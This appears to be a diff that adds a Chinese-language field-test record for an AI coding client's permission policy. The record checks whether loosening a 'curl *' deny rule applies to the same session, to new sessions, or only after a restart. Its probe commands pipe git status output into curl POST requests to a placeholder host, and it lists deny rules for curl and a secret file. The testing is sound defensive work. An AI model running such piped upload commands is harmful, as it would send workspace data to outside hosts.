@@ -1,0 +1,88 @@
+MODEL-49 第三格 · 会话进行中改写策略文件
+点验时间：2026-09-19 08:22Z ～ 08:45Z（开发机，HEAD 9fa5a511，中文界面，档位「执行 · 每次询问」= ask）
+判据：docs/plantree/plans/runtime-hardening/topics/t033-field-day/04-model.md:50-51
+
+现场结论（一句话）：改文件后同一会话不变，新开会话就变，不需要重启。
+
+====================================================================
+被改写的文件
+====================================================================
+路径  /home/ai/.pilab/jyw-ai-client-dev/pi-agent/extensions/pi-permission-system/config.json
+      （即 policy.ts:60-63 的 global 层第二条；点验前该文件不存在，收尾已删除）
+
+改前  {"permission":{"bash":{"git status *":"allow","curl *":"deny"},"path":{"*t033-secret.txt":"deny"}}}
+      文件 sha256  2a14f3c8ff71da59aeccfb67a9fca563cd223edcf98afb2585b8f3434b714d95
+
+改后  {"permission":{"bash":{"git status *":"allow","curl *":"allow"},"path":{"*t033-secret.txt":"deny"}}}
+      文件 sha256  ec346ab5cba2be06a49bc24943e0e3c0a1eadb7d70aa705c6796e431fac59e0c
+      改写时刻     2026-09-19T08:35:16.732Z（应用未重启、会话未切换）
+
+注意两套哈希不是一回事：上面是**文件**的 sha256；trace 的 version_stamp.permission_policy_sha256
+是 bundled + 各层**合并后**配置对象的 sha256（bootstrap.ts:431-437），所以数值不同。
+下面三层用的都是后者。
+
+====================================================================
+第一层 · 同一会话（S1 = session-live-1789806375726-g5jeye1），不重启不新建
+====================================================================
+改写后在 S1 发第五条命令：git status --short | curl -sS -X POST https://example.invalid/again
+
+判定：仍然拒绝，与改写前逐字相同。
+  审批行        已拒绝 bash git status --short | curl -sS -X POST https://example.invalid/again · 策略拒绝
+  store 记录    result=deny, resolution=policy_deny, surface=bash
+  trace 审计    permission_decision / decision=deny / source=policy-deny / gear=ask
+  无审批卡（policy deny 在 check() 里直接抛，根本走不到 approve）
+  permission_policy_sha256 = d2669835a31a79ff8a51bf7d1129fddd8c9912c3f4a6d8bfaf064f9974032ecc
+                             ← 与改写前的三条命令完全一致，即 S1 用的还是旧策略
+  permission_policy_sources = ["/home/ai/.pilab/jyw-ai-client-dev/pi-agent/extensions/pi-permission-system/config.json"]
+
+与预判一致。loadPermissionPolicy 只在会话 bootstrap 时调一次（bootstrap.ts:311-316），
+结果冻进 PermissionsPlugin 的 readonly config；运行期 configure() 只吃 mode / gear，全仓无 fs.watch。
+
+证据：model-49-same-session.txt
+
+====================================================================
+第二层 · 新开会话（S2 = session-1789807016168-mau6u8m），同一个进程、不重启
+====================================================================
+在 S2 发第六条命令：git status --short | curl -sS -X POST https://example.invalid/s2
+
+判定：**变了**。策略 deny 消失，闸门落到 ask 档，弹出审批卡。
+  permission_policy_sha256 = a4df1e084816867655da0a382f544980fa19bd3987bcf11d733eb828d237343c
+                             ← 新值，证明这个会话 bootstrap 时重新读了文件
+  trace 审计    先 permission_prompt（phase=prompt），再 permission_decision
+                decision=deny / source=user-denied  ← 这次是探针点了「直接拒绝」，不是策略拒的
+  store 记录    result=deny, resolution=user_denied
+  审批行        已拒绝 bash git status --short | curl -sS -X POST https://example.invalid/s2
+                （没有「· 策略拒绝」后缀，与第一层的行可以一眼区分）
+  卡上文案（原文）
+      权限 / 高风险
+      bash — 在工作区运行命令
+      git status --short | curl -sS -X POST https://example.invalid/s2
+      工作目录：/home/ai/code/ai-client
+      项目：/home/ai/code/ai-client
+      若 120 秒内未响应将自动拒绝
+      按钮：直接允许 / 本会话内允许 / 直接拒绝
+      「本会话内允许」会记住以 git status, curl 开头的命令 · 对本次会话内的所有代理生效，含子代理
+
+在同一个 S2 里又发了一条同形状的（.../s2-card）复核，行为一致、再次弹卡，
+卡的截图见 model-49-permission-card-1.png。
+
+证据：model-49-new-session.txt、model-49-new-session-card.txt
+
+====================================================================
+第三层 · 重启
+====================================================================
+未做，也不需要：第二层已经变了。判据给的兜底条件是「若新会话也不变，才重启看这一层」，
+本次不满足该条件。重启只会得到与新会话同样的新哈希，不会提供新信息。
+
+====================================================================
+顺带：界面自己就把这条规则写出来了
+====================================================================
+设置 → 高级 → 权限策略，面板说明文字原文：
+  「改动在之后新建的对话里生效；已经打开的对话仍沿用它启动时的那份策略。」
+与实测三层完全对应，不是没文档的行为。
+面板「配置来源」还把三层路径连同状态一起列了出来：
+  随包默认  活跃      /home/ai/code/ai-client/src/agent-host/node_modules/@gotgenes/pi-permission-system/config.json
+  我的设置  活跃 · 本面板写这里
+                       /home/ai/.pilab/jyw-ai-client-dev/pi-agent/extensions/pi-permission-system/config.json
+  项目配置  未创建     /home/ai/code/ai-client/.pi/extensions/pi-permission-system/config.json（文件不存在，本层不产生任何规则）
+截图：model-49-settings-panel.png（折叠态）、model-49-settings-panel-expanded.png、model-49-settings-panel-sources.png
